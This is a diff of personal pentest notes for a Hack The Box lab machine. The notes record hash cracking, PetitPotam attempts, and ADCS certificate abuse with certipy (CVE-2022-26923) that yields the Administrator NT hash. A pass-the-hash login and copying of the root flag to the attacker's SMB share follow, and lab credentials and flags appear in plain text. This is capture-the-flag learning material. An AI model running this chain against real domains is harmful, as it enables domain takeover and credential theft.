@@ -11,12 +11,13 @@
 // PublicUser : GuestUserCantWrite1
 
 //CREDS:
-// sequel.htb\sql_svc : REGGIE1234ronnie
-// sequel.htb\Ryan.Cooper : NuclearMosquito3
+// sequel.htb\sql_svc 		: REGGIE1234ronnie
+// sequel.htb\Ryan.Cooper 	: NuclearMosquito3
+// sequel.htb\Administrator : a52f78e4c751e5f5e17e1e9f3e58f4ee
 
 //Flags:
 //User: 	49fe80c971e6516eb020ce5e7b65425f
-//System:	
+//System:	7aa754d61523fc5274a6de306600b564
 
 |================================================================
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -39,6 +40,7 @@ nmap -e tun0 -Pn -A --script=default,vuln -p$ports $ip -oN 10.10.11.202_vuln.nma
 sudo nmap -e tun0 -Pn -sU --top-ports 100 $ip -oN 10.10.11.202_udp.nmap
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 // 445/tcp   open  microsoft-ds?
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -119,6 +121,7 @@ PublicUser : GuestUserCantWrite1
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+
 // 1433/tcp  open  ms-sql-s	Microsoft SQL Server 2019 15.00.2000.00
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 2023-03-10 21:38:31 EST -- 
@@ -197,12 +200,17 @@ echo 'sql_svc::sequel:aaaaaaaaaaaaaaaa:07854f24684d47523a91ed10c06fb062:01010000
 
 john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc.hash
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+o 'sql_svc::sequel:aaaaaaaaaaaaaaaa:07854f24684d47523a91ed10c06fb062:010100000000000000f0fdafd353d9013f15de46496882380000000001001000770070007a0071006d006e0064004b0003001000770070007a0071006d006e0064004b000200100075007900420068004400620068006f000400100075007900420068004400620068006f000700080000f0fdafd353d901060004000200000008003000300000000000000000000000003000008eb084490d7c486da3c43f54fceed1cc70f823186ac72ad9fd4eca0c171475000a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100390039000000000000000000' > sql_svc.hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt sql_svc.hash
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 //REGGIE1234ronnie (sql_svc)
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+//REGGIE1234ronnie (sql_svc)
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 // EXPLOIT: PetitPotem [FAIL]
@@ -212,20 +220,12 @@ wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
 
 2023-03-10 23:56:23 EST -- 
 python3 PetitPotam.py -u sql_svc -p REGGIE1234ronnie 10.10.14.199 10.10.11.202
-[-] Connecting to ncacn_np:10.10.11.202[\PIPE\lsarpc]
-[+] Connected!
-[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
-[+] Successfully bound!
-[-] Sending EfsRpcOpenFileRaw!
-[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
-[+] OK! Using unpatched function!
-[-] Sending EfsRpcEncryptFileSrv!
-[+] Got expected ERROR_BAD_NETPATH exception!!
-[+] Attack worked!
 
+//[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
 //Did not work. 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 // LoginTest
 // sql_svc : REGGIE1234ronnie
@@ -235,6 +235,7 @@ crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
 // [+] sequel.htb\sql_svc:REGGIE1234ronnie
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
 
 //ldapdomaindump
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -396,7 +397,6 @@ SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENA
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-
 // Back to WinRM
 // sequel.htb\Ryan.Cooper : NuclearMosquito3
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
@@ -500,27 +500,270 @@ SeMachineAccountPrivilege     Add workstations to domain     Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enablede
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+//Back from a break
+// Start AGAIN!!!
+2023-03-15 21:47:51 EDT -- 
+evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3
+//Success
+
+ls
 
 
+    Directory: C:\Users\Ryan.Cooper\Documents
 
 
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/15/2023   7:01 PM         174080 Certify.exe
 
 
+//Prep for wPEAS
+cd C:\Users\Ryan.Cooper\appdata\local\temp
 
-// [EXTRA] ProcDump via CrackMap
+2023-03-15 21:54:50 EDT -- 
+upload winPEASany.exe
+
+//Start
+impacket-smbserver -smb2support PUBLIC .
+
+//Test
+2023-03-15 22:07:38 EDT -- 
+net use \\10.10.16.5\PUBLIC
+
+2023-03-15 22:09:33 EDT -- 
+./winPEASany.exe -lolbas log=\\10.10.16.5\PUBLIC\wPEAS_RyanCooper.out
+
+//wPEAS out info
+SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+
+╔══════════╣ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  sequel
+    DefaultUserName               :  Administrator
+
+
+//Possible Virus on remote host
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-wget https://download.sysinternals.com/files/Procdump.zip
-unzip -p Procdump.zip procdump64.exe > /tmp/procdump.exe
+ls
 
-2023-03-14 20:21:22 EDT -- 
-crackmapexec smb 10.10.11.202 -u sql_svc -p REGGIE1234ronnie
 
-2023-03-14 20:21:23 EDT -- 
-crackmapexec smb 10.10.11.202 -u sql_svc -p REGGIE1234ronnie -M procdump 
+    Directory: C:\Users\Ryan.Cooper\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        3/15/2023   7:01 PM         174080 Certify.exe
+
+2023-03-15 22:47:26 EDT -- 
+get-filehash C:\Users\Ryan.Cooper\Documents\Certify.exe
+
+Algorithm       Hash                                                                   Path
+---------       ----                                                                   ----
+SHA256          AF5C3A5F68323AC68B258DAE37C20E48F594118D08479F92A78BD54D26DEBD9A       C:\Users\Ryan.Cooper\Documents\Certify.exe
+
+download Certify.exe
+
+file Certify.exe 
+Certify.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+//Seems to effecting cert services
+//The PotitPotam vuln was found above, failed with sql_svc user account
+//Lets try with Ryan.Cooper account
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+// EXPLOIT: PetitPotem [FAILED]
+// Petitpotam is a vulnerability that allows a domain user to take over domain controllers through triggering authentications using the MS-EFSRPC protocol.
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-15 23:03:08 EDT -- 
+crackmapexec smb 10.10.11.202 -u '' -p '' -M petitpotam
+
+PETITPOT... 10.10.11.202    445    DC               VULNERABLE
+PETITPOT... 10.10.11.202    445    DC               Next step: https://github.com/topotam/PetitPotam
+
+2023-03-15 23:05:31 EDT -- 
+crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M petitpotam
+
+2023-03-15 23:06:02 EDT -- 
+wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py
+
+2023-03-15 23:07:55 EDT -- 
+python3 PetitPotam.py -u Ryan.Cooper -p NuclearMosquito3 10.10.16.5 10.10.11.202
+
+//[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+//Did not work
+
+//Trying different pipe options
+2023-03-15 23:11:17 EDT -- 
+python3 PetitPotam.py -u Ryan.Cooper -p NuclearMosquito3 -pipe all 10.10.16.5 10.10.11.202
+
+//[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+//FAILED: Patched for all pipes
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Exploiting CVE-2022–26923 by Abusing Active Directory Certificate Services (ADCS)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+2023-03-15 23:29:23 EDT -- 
+get-process 
+385      34    12684      21444              2348   0 certsrv
+
+# Configuring DNS
+echo '10.10.11.202 dc dc.sequel.htb sequel.htb' >> /etc/hosts
+
+# Testing Certificate Generation
+sudo apt update
+apt search certipy
+sudo apt install certipy-ad
+
+// certipy (CVE-2022–26923)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// Find ADCS servers
+// Save ADCS server Name!
+// Uses LDAPS port 636 by default; also needs TCP 53 & 445
+
+//find                Enumerate AD CS
+2023-03-15 23:36:10 EDT -- 
+certipy-ad find -u Ryan.Cooper -p NuclearMosquito3 -dc-ip 10.10.11.202 -ns 10.10.11.202 -dns-tcp
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Trying to get CA configuration for 'sequel-DC-CA' via CSRA
+[!] Got error while trying to get CA configuration for 'sequel-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+[*] Trying to get CA configuration for 'sequel-DC-CA' via RRP
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Got CA configuration for 'sequel-DC-CA'
+[*] Saved BloodHound data to '20230315233659_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20230315233659_Certipy.txt'
+[*] Saved JSON output to '20230315233659_Certipy.json
+
+// CA name: sequel-DC-CA
+
+// Generating a certificate for our low-privileged AD user:
+2023-03-15 23:54:58 EDT -- 
+certipy-ad req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.202
+
+//[-] Got error: The NETBIOS connection with the remote host timed out.
+//Running Again
+2023-03-16 00:01:00 EDT -- 
+certipy-ad req -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -target dc.sequel.htb -ca sequel-DC-CA -template UserAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.202 
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Successfully requested certificate
+[*] Request ID is 13
+[*] Got certificate with UPN 'Administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'administrator.pfx'
+
+// Verify that certificate is valid
+2023-03-16 00:03:56 EDT -- 
+certipy-ad auth -pfx administrator.pfx
+
+Certipy v4.0.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+
+// fix clock skew if necessary (UDP to NTP port)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Remote Time
+Get-Date
+Thursday, March 16, 2023 5:06:03 AM
+
+//Local Time
+date
+Thu Mar 16 12:06:39 AM EDT 2023
+
+// install ntpdate
+sudo apt install -y ntpdate
+
+// update the local kali time
+2023-03-16 00:10:18 EDT -- 
+sudo ntpdate -b -u 10.10.11.202
+
+//Time kept changing. PISSSED ME OFFF
+//So to keep the time set..
+sudo watch -n 1 'ntpdate -b 10.10.11.202'
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+// Verify that certificate is valid
+certipy-ad auth -pfx administrator.pfx
+
+[*] Using principal: administrator@sequel.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got NT hash for 'administrator@sequel.htb': a52f78e4c751e5f5e17e1e9f3e58f4ee
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// evil-winrm
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+// connect
+2023-03-16 09:02:24 EDT -- 
+evil-winrm -i 10.10.11.202 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+//Success!!!
+
+2023-03-16 01:04:50 EDT -- 
+ls C:\Users\Administrator\Desktop
+
+2023-03-16 01:06:26 EDT -- 
+copy root.txt \\10.10.16.5\PUBLIC\root.txt
+
+cat root.txt
+//7aa754d61523fc5274a6de306600b564
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#PWNED
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⠶⠖⠛⠛⠛⠳⠶⠶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⢀⣴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠉⢿⡀⠀⠀⠀⠀⠀⠀⣠⡶⠶⣄⠀⢸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢠⡿⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⣰⠇⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢸⠏⠀⠀⢸⡆⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⢀⣾⠀⠀⠀⠀⠀⢰⣿⠀⠀⠀⣸⠁⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⣾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⣠⡾⠁⠀⠀⠀⠀⠀⠈⢿⡀⠒⣰⡏⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢰⡟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠶⠟⠋⣠⡴⠶⠟⠒⢶⣄⠀⠈⠉⠉⠉⠀⠀⢠⡿⡀⠀⠀⠀⢀⣶⠶⣦⠀⠀
+⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⢠⡟⢻⡏⢤⣟⡄⠀
+⢰⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠘⠿⠚⠻⠾⠋⠁⠀
+⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⡀
+⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣿⠹⣗⡆⣸⡇
+⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⠻⠖⠷⣧⠟⠀
+⡏⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠀⠀⠀⠈⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⢸⡆⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡦⠄⢹⡆⠀⠀⠀⠀⠀⠀⠀
+⣿⠀⠀⠈⣿⠀⠀⣿⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡓⠚⠃⠀⠀⠀⠀⠀⠀⠀
+⢹⡄⠀⠀⢻⣆⣂⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⡇⠀⠀⠀⠙⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡆⠀⠀⠀⠀⠀⠀⠀⠀
+⠘⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⢻⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢄⣾⠁⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⢀⡀⠀⠀⢀⣼⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠙⢧⣀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⠀⠀⣠⣾⡇⠀⠀⠀⠀⣠⣾⣥⣤⡴⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠙⠷⢦⣤⣀⣀⣠⡴⠟⠉⠛⠶⠦⠤⠶⠾⠋⠉⠛⠓⠶⠚⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+2023-03-16 01:33:39 EDT -- COMPLETE
